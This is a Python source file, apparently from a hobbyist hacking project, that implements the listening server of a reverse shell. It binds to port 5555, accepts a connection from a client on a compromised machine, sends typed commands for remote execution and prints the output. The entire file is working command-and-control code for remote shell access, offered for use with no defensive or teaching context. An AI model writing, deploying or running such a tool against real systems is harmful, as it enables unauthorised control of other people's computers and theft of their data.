# Created by Vinura Yashohara(AnonyMSAV).
# Server of the reverse shell program (Control unit).
import socket, os, platform

system = platform.platform()

if('Linux' in system):

    os.system('clear')

elif('Windows' in system):

    os.system('cls')

print('''
	███╗   ██╗ ██████╗ ██╗   ██╗ █████╗ 
	████╗  ██║██╔═══██╗██║   ██║██╔══██╗
	██╔██╗ ██║██║   ██║██║   ██║███████║
	██║╚██╗██║██║   ██║╚██╗ ██╔╝██╔══██║
	██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
	╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
	Created by : Vinura Yashohara (AnonyMSAV)
	''')

ip_address = socket.gethostbyname(socket.gethostname())
port = 5555
address = ip_address, port

# Make server socket and bind ip and port for it.
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(address)

print(f'[+] Server starts at {ip_address}:{port}')

def main():

	# Listen clients and connect them.
	server.listen()
	print('[+] Server listening ..')
	conn,addr = server.accept()
	
	print(f'[+] {addr} connected')

	while True:

		commands = input(f'\n>> ')

		# If command is empty it continue the program.
		if(commands == ''):

			continue

		elif(commands == 'cd'):
			commands = 'pwd'
		
		conn.send(commands.encode('utf-8'))

		# If commands equal 'quit' it close the client's connection.
		if(commands == 'quit'):

			print('[+] Connection clossed')
			conn.close()
			server.close()
			break

		recieve = conn.recv(2048).decode('utf-8')

		if(recieve == ' '):
			print('\n')
		
		print(recieve)

main()
